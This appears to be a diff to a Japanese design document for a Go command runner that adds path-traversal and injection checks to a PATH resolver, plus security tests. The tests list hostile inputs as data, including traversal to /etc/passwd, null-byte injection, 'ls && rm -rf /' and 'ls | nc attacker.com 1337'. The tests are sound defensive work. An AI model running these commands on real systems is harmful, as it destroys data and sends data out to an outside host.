@@ -207,20 +207,35 @@ func NewPathResolver(pathEnv string, security *security.Validator, skipStandardP
 }
 
 func (pr *PathResolver) ResolvePath(command string) (string, error) {
-    // 1. 絶対パスの場合はそのまま返す
+    // 1. パストラバーサル攻撃の検証
+    if err := pr.validateCommandSafety(command); err != nil {
+        return "", fmt.Errorf("unsafe command rejected: %w", err)
+    }
+
+    // 2. 絶対パスの場合はそのまま返す
     if filepath.IsAbs(command) {
         return command, nil
     }
 
-    // 2. PATH環境変数から解決
+    // 3. PATH環境変数から解決
     for _, dir := range strings.Split(pr.pathEnv, ":") {
-        // 3. 各PATHディレクトリのセキュリティ検証
+        // 4. 各PATHディレクトリのセキュリティ検証
         if err := pr.security.ValidateDirectoryPermissions(dir); err != nil {
             continue // 不安全なディレクトリはスキップ
         }
 
-        // 4. コマンドファイルの存在確認
+        // 5. コマンドファイルの存在確認
         fullPath := filepath.Join(dir, command)
+
+        // 6. 解決されたパスが想定ディレクトリ内にあることを確認
+        if !pr.isPathWithinDirectory(fullPath, dir) {
+            slog.Warn("Path traversal attempt detected",
+                "command", command,
+                "directory", dir,
+                "resolved_path", fullPath)
+            continue // パストラバーサル試行をスキップ
+        }
+
         if info, err := os.Stat(fullPath); err == nil && !info.IsDir() {
             // 実行権限確認
             if info.Mode()&0111 != 0 {
@@ -230,6 +245,65 @@ func (pr *PathResolver) ResolvePath(command string) (string, error) {
     }
 
     return "", fmt.Errorf("command not found in secure PATH: %s", command)
+}
+
+// パストラバーサル攻撃の検証
+func (pr *PathResolver) validateCommandSafety(command string) error {
+    // 1. NULLバイト攻撃の検出
+    if strings.Contains(command, "\x00") {
+        return fmt.Errorf("command contains null bytes")
+    }
+
+    // 2. パストラバーサル文字列の検出
+    if strings.Contains(command, "..") {
+        return fmt.Errorf("command contains path traversal sequences")
+    }
+
+    // 3. パス区切り文字の検証（相対パスコマンドではスラッシュは不正）
+    if strings.Contains(command, "/") && !filepath.IsAbs(command) {
+        return fmt.Errorf("relative command contains path separators")
+    }
+
+    // 4. 制御文字の検出
+    for _, r := range command {
+        if r < 32 && r != '\t' && r != '\n' && r != '\r' {
+            return fmt.Errorf("command contains control characters")
+        }
+    }
+
+    // 5. コマンド名の長さ制限
+    if len(command) > 255 {
+        return fmt.Errorf("command name too long")
+    }
+
+    return nil
+}
+
+// 解決されたパスが想定ディレクトリ内にあることを確認
+func (pr *PathResolver) isPathWithinDirectory(resolvedPath, baseDir string) bool {
+    // パスを正規化
+    cleanResolved := filepath.Clean(resolvedPath)
+    cleanBase := filepath.Clean(baseDir)
+
+    // 絶対パスに変換
+    absResolved, err := filepath.Abs(cleanResolved)
+    if err != nil {
+        return false
+    }
+
+    absBase, err := filepath.Abs(cleanBase)
+    if err != nil {
+        return false
+    }
+
+    // ベースディレクトリ内にあることを確認
+    rel, err := filepath.Rel(absBase, absResolved)
+    if err != nil {
+        return false
+    }
+
+    // ../ で始まる場合はディレクトリ外
+    return !strings.HasPrefix(rel, "..")
 }
 
 func (pr *PathResolver) ShouldSkipVerification(path string) bool {
@@ -484,6 +558,22 @@ internal/
 
 ### 4.2 PATH解決のセキュリティ
 
+#### 4.2.1 パストラバーサル攻撃対策
+
+**多層防御アプローチ:**
+
+1. **事前検証**: コマンド文字列の安全性チェック
+   - `..` 文字列の検出と拒否
+   - NULLバイト攻撃の検出
+   - 制御文字の検出
+   - 相対パスでの `/` 文字の検出
+
+2. **事後検証**: 解決されたパスの妥当性確認
+   - `filepath.Rel()` を使用したディレクトリ外アクセスの検出
+   - 絶対パス正規化による迂回攻撃の防止
+
+3. **ディレクトリ権限検証**: PATH内の各ディレクトリの安全性確認
+
 ```go
 // セキュアなPATH解決
 func (pr *PathResolver) securePathResolution(command string) (string, error) {
@@ -500,6 +590,16 @@ func (pr *PathResolver) securePathResolution(command string) (string, error) {
 
         // 2. コマンドファイル確認
         fullPath := filepath.Join(dir, command)
+
+        // 3. パストラバーサル検証
+        if !isPathWithinDirectory(fullPath, dir) {
+            slog.Warn("Path traversal attempt detected",
+                "command", command,
+                "directory", dir,
+                "resolved_path", fullPath)
+            continue
+        }
+
         if info, err := os.Stat(fullPath); err == nil && !info.IsDir() {
             // 実行権限確認
             if info.Mode()&0111 != 0 {
@@ -637,6 +737,213 @@ func TestManager_VerifyGroupFiles_BatchProcessing(t *testing.T) {
     assert.Equal(t, 3, result.TotalFiles)      // 重複排除後の合計
     assert.Equal(t, 3, result.VerifiedFiles)  // 全て検証成功
     assert.Empty(t, result.FailedFiles)       // 失敗なし
+}
+```
+
+### 6.3 セキュリティテスト
+
+```go
+// 包括的なパストラバーサル攻撃テスト
+func TestPathResolver_PathTraversalSecurity(t *testing.T) {
+    mockFS := common.NewMockFileSystem()
+
+    // 安全なディレクトリ構造作成
+    mockFS.AddDir("/usr/bin", 0755)
+    mockFS.AddFile("/usr/bin/ls", 0755, []byte("safe ls"))
+    mockFS.AddDir("/etc", 0755)
+    mockFS.AddFile("/etc/passwd", 0644, []byte("sensitive data"))
+
+    security, _ := security.NewValidatorWithFS(security.DefaultConfig(), mockFS)
+    pathResolver := NewPathResolver("/usr/bin", security, false)
+
+    // パストラバーサル攻撃のテストケース
+    maliciousCommands := []struct {
+        name    string
+        command string
+        reason  string
+    }{
+        {
+            name:    "basic_path_traversal",
+            command: "../../../etc/passwd",
+            reason:  "contains .. sequences",
+        },
+        {
+            name:    "relative_path_with_separator",
+            command: "../../bin/sh",
+            reason:  "relative path with separators",
+        },
+        {
+            name:    "null_byte_injection",
+            command: "ls\x00../../../etc/passwd",
+            reason:  "contains null bytes",
+        },
+        {
+            name:    "control_character_injection",
+            command: "ls\x01malicious",
+            reason:  "contains control characters",
+        },
+        {
+            name:    "directory_escape_slash",
+            command: "../etc/passwd",
+            reason:  "directory escape attempt",
+        },
+        {
+            name:    "long_command_name",
+            command: strings.Repeat("a", 300),
+            reason:  "command name too long",
+        },
+    }
+
+    for _, tc := range maliciousCommands {
+        t.Run(tc.name, func(t *testing.T) {
+            _, err := pathResolver.ResolvePath(tc.command)
+            assert.Error(t, err, "Should reject malicious command: %s (%s)", tc.command, tc.reason)
+            assert.Contains(t, err.Error(), "unsafe command rejected",
+                "Error should indicate security rejection")
+        })
+    }
+}
+
+func TestPathResolver_ValidateCommandSafety(t *testing.T) {
+    pathResolver := &PathResolver{}
+
+    testCases := []struct {
+        name        string
+        command     string
+        shouldError bool
+        errorText   string
+    }{
+        {
+            name:        "safe_command",
+            command:     "ls",
+            shouldError: false,
+        },
+        {
+            name:        "safe_absolute_path",
+            command:     "/usr/bin/ls",
+            shouldError: false,
+        },
+        {
+            name:        "path_traversal_dots",
+            command:     "../../../etc/passwd",
+            shouldError: true,
+            errorText:   "path traversal sequences",
+        },
+        {
+            name:        "relative_with_slash",
+            command:     "subdir/command",
+            shouldError: true,
+            errorText:   "path separators",
+        },
+        {
+            name:        "null_byte_attack",
+            command:     "ls\x00",
+            shouldError: true,
+            errorText:   "null bytes",
+        },
+        {
+            name:        "control_characters",
+            command:     "ls\x01",
+            shouldError: true,
+            errorText:   "control characters",
+        },
+        {
+            name:        "too_long_command",
+            command:     strings.Repeat("x", 256),
+            shouldError: true,
+            errorText:   "too long",
+        },
+    }
+
+    for _, tc := range testCases {
+        t.Run(tc.name, func(t *testing.T) {
+            err := pathResolver.validateCommandSafety(tc.command)
+
+            if tc.shouldError {
+                assert.Error(t, err)
+                assert.Contains(t, err.Error(), tc.errorText)
+            } else {
+                assert.NoError(t, err)
+            }
+        })
+    }
+}
+
+func TestPathResolver_IsPathWithinDirectory(t *testing.T) {
+    pathResolver := &PathResolver{}
+
+    testCases := []struct {
+        name         string
+        resolvedPath string
+        baseDir      string
+        expected     bool
+    }{
+        {
+            name:         "safe_path_within_directory",
+            resolvedPath: "/usr/bin/ls",
+            baseDir:      "/usr/bin",
+            expected:     true,
+        },
+        {
+            name:         "path_traversal_escape",
+            resolvedPath: "/etc/passwd",
+            baseDir:      "/usr/bin",
+            expected:     false,
+        },
+        {
+            name:         "relative_escape_attempt",
+            resolvedPath: "/usr/bin/../../../etc/passwd",
+            baseDir:      "/usr/bin",
+            expected:     false,
+        },
+        {
+            name:         "subdirectory_access",
+            resolvedPath: "/usr/bin/subdir/tool",
+            baseDir:      "/usr/bin",
+            expected:     true,
+        },
+    }
+
+    for _, tc := range testCases {
+        t.Run(tc.name, func(t *testing.T) {
+            result := pathResolver.isPathWithinDirectory(tc.resolvedPath, tc.baseDir)
+            assert.Equal(t, tc.expected, result)
+        })
+    }
+}
+
+func TestSecurity_RealWorldAttackScenarios(t *testing.T) {
+    mockFS := common.NewMockFileSystem()
+
+    // 実際の攻撃シナリオをシミュレート
+    mockFS.AddDir("/usr/bin", 0755)
+    mockFS.AddDir("/tmp", 0777) // 攻撃者が書き込み可能
+    mockFS.AddFile("/tmp/malicious", 0755, []byte("malicious binary"))
+    mockFS.AddFile("/etc/passwd", 0644, []byte("root:x:0:0:root:/root:/bin/bash"))
+
+    security, _ := security.NewValidatorWithFS(security.DefaultConfig(), mockFS)
+
+    // 攻撃シナリオ1: PATHインジェクション
+    maliciousPATH := "/tmp:/usr/bin"
+    pathResolver := NewPathResolver(maliciousPATH, security, false)
+
+    // 不安全な/tmpディレクトリは権限チェックで排除される
+    _, err := pathResolver.ResolvePath("malicious")
+    assert.Error(t, err, "Should reject commands from insecure directories")
+
+    // 攻撃シナリオ2: コマンドインジェクション試行
+    attackCommands := []string{
+        "ls; cat /etc/passwd",
+        "ls && rm -rf /",
+        "ls | nc attacker.com 1337",
+        "$(cat /etc/passwd)",
+        "`cat /etc/passwd`",
+    }
+
+    for _, cmd := range attackCommands {
+        _, err := pathResolver.ResolvePath(cmd)
+        assert.Error(t, err, "Should reject command injection attempt: %s", cmd)
+    }
 }
 ```
 
